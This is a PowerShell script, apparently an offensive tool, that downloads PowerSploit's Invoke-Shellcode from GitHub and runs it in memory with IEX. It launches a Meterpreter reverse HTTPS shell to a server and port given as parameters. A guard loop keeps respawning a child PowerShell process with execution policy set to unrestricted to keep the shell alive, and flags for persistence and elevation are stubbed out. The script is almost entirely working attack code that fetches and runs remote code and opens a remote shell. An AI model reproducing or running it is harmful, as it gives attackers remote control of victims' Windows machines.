param (
    [string]$server = $(throw "-server is required"),
    [string]$port = $(throw "-port is required"),
    [string]$child,
    [string]$persistence,
    [string]$elevate
)

function Run-Meterpreter 
{
    IEX (New-Object Net.Webclient).downloadstring(
    'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d0fff7b6371ccb52952268f47ae68e85c3aeeb91/CodeExecution/Invoke-Shellcode.ps1'
    )
    Invoke-Shellcode –Payload windows/meterpreter/reverse_https –Lhost $server –Lport $port –Force
}

function Run-Child 
{
    param([ref]$process)
    $arg = "-NoProfile -ExecutionPolicy unrestricted", "-file $PSScriptRoot\NS.ps1", "-server $server", "-port $port", "-child"
    $process_id = (Start-Process -FilePath powershell.exe -ArgumentList $arg -PassThru).Id
    $process = Get-Process -Id $process_id
}

function Run-Guard
{
    Set-Variable $process = $null
    while ($true)
    {
        if ($process) {
            Sleep 60
        } else {
            Run-Child $process
        }
    }
}

if ($persistence) {
    #method 1
    #method 2
    #method 3
    #method 4
}

if ($child) {
    Run-Meterpreter
} else {
    Run-Guard
}